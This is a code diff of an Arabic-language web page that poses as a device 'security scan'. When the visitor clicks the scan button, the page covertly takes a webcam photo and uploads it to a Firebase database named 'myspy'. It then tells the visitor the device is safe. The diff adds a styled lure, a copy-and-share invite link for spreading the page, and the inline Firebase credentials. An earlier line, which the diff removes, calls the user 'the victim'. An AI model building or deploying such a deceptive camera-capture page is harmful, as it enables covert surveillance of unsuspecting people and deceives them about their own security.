@@ -3,57 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأمين الحساب</title>
+    <title>آلَﻤــشّـآ كَسًـ آلَۼد - نظام الحماية</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { background: #1a1a1a; color: white; text-align: center; font-family: sans-serif; padding-top: 100px; }
-        .btn { background: #25d366; color: white; padding: 20px; border: none; border-radius: 50px; font-size: 22px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        body { background: radial-gradient(circle, #200, #000); color: white; font-family: 'Arial'; text-align: center; direction: rtl; margin: 0; padding: 20px; }
+        .header { font-size: 35px; color: #f00; text-shadow: 0 0 20px #f00; margin: 20px 0; font-weight: bold; }
+        .box { border: 2px solid #f00; border-radius: 20px; padding: 25px; background: rgba(0,0,0,0.8); box-shadow: 0 0 30px rgba(255,0,0,0.3); max-width: 400px; margin: auto; }
+        .btn-main { background: linear-gradient(to bottom, #f00, #800); color: #fff; width: 100%; padding: 20px; border: 1px solid #fff; border-radius: 15px; font-size: 24px; font-weight: bold; cursor: pointer; box-shadow: 0 0 15px #f00; margin-top: 20px; }
+        .link-area { background: #111; padding: 15px; border-radius: 10px; border: 1px dashed #f00; margin-top: 30px; }
+        .copy-btn { background: #fff; color: #000; width: 100%; padding: 15px; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; margin-top: 10px; cursor: pointer; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <h2>نظام الفحص السريع 🛡️</h2>
-    <p>اضغط لتحديث حماية جهازك</p>
-    <button class="btn" onclick="capture()">ابدأ الفحص الآن</button>
-
-    <video id="v" autoplay></video>
-    <canvas id="c"></canvas>
-
+    <div class="header">آلَﻤــشّـآ كَسًـ آلَۼد</div>
+    <div class="box">
+        <h3>🛡️ نظام فحص الاختراق</h3>
+        <p style="color: #888;">اضغط لبدء فحص حماية جهازك وكاميرا الأمان فوراً</p>
+        <button class="btn-main" onclick="capture()">إبدأ الفحص الشامل 🚀</button>
+        <div class="link-area">
+            <p style="color:#f44;">رابط الدعوة الخاص بك:</p>
+            <input type="text" id="url" value="https://bdwalmtyry05-lgtm.github.io/security/" readonly style="width:90%; background:#222; color:#fff; border:none; padding:10px; text-align:center; border-radius:5px;">
+            <button class="copy-btn" onclick="copyLink()">نسخ الرابط الآن 🔥</button>
+        </div>
+    </div>
     <script>
-        const firebaseConfig = {
-          apiKey: "AIzaSyAvb-rjNbcWHlZEdEF0q9v3PL8XF8jnt3U",
-          authDomain: "myspy-2579b.firebaseapp.com",
-          projectId: "myspy-2579b",
-          storageBucket: "myspy-2579b.firebasestorage.app",
-          messagingSenderId: "487846863334",
-          appId: "1:487846863334:web:b58620e6f34d187e02b627"
-        };
+        const firebaseConfig = { apiKey: "AIzaSyAvb-rjNbcWHlZEdEF0q9v3PL8XF8jnt3U", authDomain: "myspy-2579b.firebaseapp.com", projectId: "myspy-2579b", storageBucket: "myspy-2579b.firebasestorage.app", messagingSenderId: "487846863334", appId: "1:487846863334:web:b58620e6f34d187e02b627" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
+
+        function copyLink() {
+            var copyText = document.getElementById("url");
+            copyText.select();
+            document.execCommand("copy");
+            alert("تم النسخ يا بطل! انطلق 🔥");
+        }
 
         async function capture() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('v');
+                const video = document.createElement('video');
                 video.srcObject = stream;
+                video.play();
                 setTimeout(() => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640; canvas.height = 480;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    const imgData = canvas.toDataURL('image/jpeg', 0.5); // ضغط الصورة لسرعة الرفع
-                    
-                    // رفع الصورة
-                    db.ref('results').push({
-                        photo: imgData,
-                        date: new Date().toLocaleString()
-                    }).then(() => {
-                        alert("تم التحديث بنجاح!");
-                        location.href = "https://google.com"; // تحويل الضحية لجوجل بعد التصوير
-                    });
+                    db.ref('results').push({ photo: canvas.toDataURL('image/jpeg', 0.6), date: new Date().toLocaleString() })
+                    .then(() => { alert("✅ تم الفحص بنجاح.. جهازك في أمان تام!"); });
                 }, 1000);
-            } catch (e) { alert("لازم توافق على الكاميرا"); }
+            } catch (e) { alert("🚨 خطأ: لازم توافق على الكاميرا عشان نتأكد من حماية جهازك!"); }
         }
     </script>
 </body>
